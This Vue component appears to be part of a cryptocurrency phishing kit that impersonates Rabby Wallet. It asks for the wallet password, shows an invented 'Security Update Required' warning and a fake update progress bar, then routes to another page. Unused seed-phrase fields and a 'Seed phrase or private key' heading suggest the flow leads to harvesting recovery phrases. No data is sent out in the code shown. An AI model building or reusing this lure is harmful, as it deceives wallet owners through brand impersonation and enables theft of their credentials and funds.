<template>
  <div class="bg-[#dee3fc] rounded-2xl w-full text-white overflow-hidden p-6">
    <!-- Header -->
    <div
      v-if="currentStep === 3"
      class="flex justify-between items-center py-4 px-4 border-b border-gray-700"
    >
      <button
        @click="goBackToStep2"
        style="background: black; border: none; padding: 0"
        class=""
      >
        <svg
          class="text-white hover:text-white h-6 w-6"
          xmlns="http://www.w3.org/2000/svg"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M15 19l-7-7 7-7"
          />
        </svg>
      </button>
      <div class="text-3xl font-bold text-black">
        {{
          currentStep === 2
            ? "Connect account"
            : currentStep === 3
            ? "Updating account"
            : "Seed phrase or private key"
        }}
      </div>
      <span class="w-6"></span>
      <!-- Spacer for balance -->
    </div>

    <hr class="border-t m-0 border-gray-500" v-if="currentStep !== 1" />

    <!-- Step Container -->
    <div class="min-h-[420px] flex flex-col relative">
      <transition name="fade" mode="out-in">
        <div :key="currentStep">
          <!-- STEP 1 -->
          <template v-if="currentStep === 1">
            <div class="flex flex-col items-center justify-center">
              <div class="rounded-3xl flex justify-center w-full pt-[90px]">
                <img
                  class="w-[80px] h-[80px]"
                  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJrC3RZTRdI3uRtXUx410pplNxUBLjtwVgqA&s"
                  alt="Rabby Wallet"
                />
              </div>
              <form class="w-full my-6">
                <h2
                  style="color: black"
                  class="text-5xl leading-[24px] text-center font-bold mb-6 mt-2 tracking-[-0.02em]"
                >
                  Rabby Wallet
                </h2>
                <p
                  class="text-gray-500 font-semibold text-center text-2xl mb-8"
                >
                  The game-changing wallet for Ethereum and all EVM chains
                </p>
                <div class="mb-2 mt-[40px]">
                  <input
                    type="password"
                    v-model="password"
                    style="background: white; font-size: 14px"
                    class="w-full font-medium bg-[#eeeeee] rounded-[6px] p-3 text-[#777777] placeholder-[#777777] focus-visible:border-[#2f2f2f] focus-visible:ring-0 focus-visible:outline-none"
                    placeholder="Enter the Password to unlock"
                    required
                  />
                </div>

                <div class="mt-[60px]">
                  <button
                    @click="unlock"
                    type="button"
                    :disabled="password.length < 1 || isLoading"
                    class="w-full py-4 px-4 mb-2 bg-[#7084ff] border-none outline-none hover:border-none hover:text-[#222] rounded-[10px] font-semibold text-2xl duration-200 flex items-center justify-center bg-[#333] text-white relative"
                  >
                    <span v-if="!isLoading">Unlock</span>
                    <svg
                      v-else
                      class="animate-spin h-6 w-6 text-black"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        class="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        stroke-width="4"
                      />
                      <path
                        class="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                      />
                    </svg>
                  </button>
                  <div class="text-center mt-[40px]">
                    <a
                      href="#"
                      class="text-2xl text-[#7084ff] font-semibold mt-2 hover:text-white"
                      >Forgot password?</a
                    >
                  </div>
                </div>
              </form>
            </div>
          </template>

          <!-- STEP 2 -->
          <template v-else-if="currentStep === 2">
            <div class="rounded-3xl flex justify-center w-full pt-[90px]">
              <img
                class="w-[80px] h-[80px]"
                src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJrC3RZTRdI3uRtXUx410pplNxUBLjtwVgqA&s"
                alt="Rabby Wallet"
              />
            </div>
            <h2
              style="color: black"
              class="text-5xl leading-[24px] text-center font-bold mb-6 mt-2 tracking-[-0.02em]"
            >
              Update Available
            </h2>
            <p class="text-gray-500 font-semibold text-center text-2xl mb-8">
              A new version of Rabby is available with important security
              improvements.
            </p>

            <div class="mt-[30px] mb-[60px]">
              <div class="bg-orange-100 rounded-lg p-4">
                <div class="flex items-start">
                  <div class="p-0 mr-4">⚠️</div>
                  <div>
                    <div class="text-yellow-900 text-[16px] font-bold mb-1">
                      Security Update Required
                    </div>
                    <p class="text-yellow-900 text-[14px] leading-8 mt-2">
                      For your wallet's security, please update to the latest
                      version of Rabby.
                    </p>
                  </div>
                </div>
              </div>
            </div>
            <div class="w-full pt-6 pb-[10px]">
              <div class="flex gap-3 w-full mt-[40px]">
                <button
                  @click="nextStep"
                  class="w-full py-4 px-4 mb-2 bg-[#7084ff] border-none outline-none hover:border-none hover:text-[#222] rounded-[10px] font-semibold text-2xl duration-200 flex items-center justify-center bg-[#333] text-white relative"
                >
                  Confirm
                </button>
              </div>
            </div>
          </template>

          <!-- STEP 3 (Multi-stage) -->
          <template v-else-if="currentStep === 3">
            <div key="s3" class="flex flex-col items-center p-6">
              <div class="flex flex-col items-center gap-3 py-6 w-full">
                <div class="rounded-3xl flex justify-center w-full pt-[90px]">
                  <img
                    class="w-[80px] h-[80px]"
                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJrC3RZTRdI3uRtXUx410pplNxUBLjtwVgqA&s"
                    alt="Rabby Wallet"
                  />
                </div>
                <h2
                  style="color: black"
                  class="text-5xl leading-[24px] text-center font-bold mb-6 mt-2 tracking-[-0.02em]"
                >
                  Updating
                </h2>
                <p
                  class="text-gray-500 font-semibold text-center text-2xl mb-8"
                >
                  Please wait while we update to version 3.10.0.
                </p>

                <div class="w-full mt-6">
                  <div class="bg-gray-100 h-3 rounded-full overflow-hidden">
                    <div
                      class="h-3 rounded-full transition-all"
                      :style="{
                        width: progress + '%',
                        background: '#6366F1',
                      }"
                    ></div>
                  </div>
                  <div
                    class="flex items-center text-center justify-center font-bold mt-2 text-[14px] text-black"
                  >
                    <span>{{ Math.round(progress) }}%</span>
                  </div>
                </div>

                <p class="text-gray-200 text-lg text-center mt-4 text-center">
                  This may take a few moments. Please do not close this window.
                </p>
              </div>
            </div>
          </template>
        </div>
      </transition>

      <!-- Success & Error Message -->
      <transition name="fade">
        <div
          v-if="message.text"
          :class="[
            'absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold',
            message.type === 'success'
              ? 'bg-green-600 text-white'
              : 'bg-red-600 text-white',
          ]"
        >
          {{ message.text }}
        </div>
      </transition>
    </div>
  </div>
</template>

<script setup>
import { ref, watch } from "vue";

import { navigateTo } from "#app";

const emit = defineEmits(["close"]);
const currentStep = ref(1);
const password = ref("");
const isLoading = ref(false);
const progress = ref(0);
const message = ref({ text: "", type: "" });

const selectedWordCount = ref("12");
const phraseWords = ref([]);
const hiddenFields = ref([]);

// Initialize phrase words based on selected count
function initPhraseWords() {
  const count = parseInt(selectedWordCount.value);
  phraseWords.value = Array(count).fill("");
  hiddenFields.value = Array(count).fill(true);
}

// Navigation
function goBackToStep2() {
  currentStep.value = 2;
}

function unlock() {
  if (password.value.length < 1) return;
  isLoading.value = true;
  setTimeout(() => {
    isLoading.value = false;
    nextStep();
  }, 2000);
}

async function startUpdate() {
  currentStep.value = 3;
  progress.value = 0;

  const duration = 3000;
  const start = performance.now();
  isLoading.value = true;

  function step(now) {
    const elapsed = now - start;
    const pct = Math.min(100, (elapsed / duration) * 100);
    progress.value = pct;
    if (elapsed < duration) {
      requestAnimationFrame(step);
    } else {
      isLoading.value = false;
      setTimeout(() => {
        navigateTo("/single-wallet/rabby-wallet");
      }, 400);
    }
  }
  requestAnimationFrame(step);
}

function nextStep() {
  if (currentStep.value < 3) {
    currentStep.value++;
    if (currentStep.value === 3) startUpdate();
  }
}

// Initialize
watch(currentStep, (val) => {
  if (val === 3) startUpdate();
});

// Initialize phrase words when component mounts
initPhraseWords();
</script>

<style scoped>
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.4s ease;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}

input::placeholder {
  font-size: 14px;
  color: #9ca3af;
}
</style>
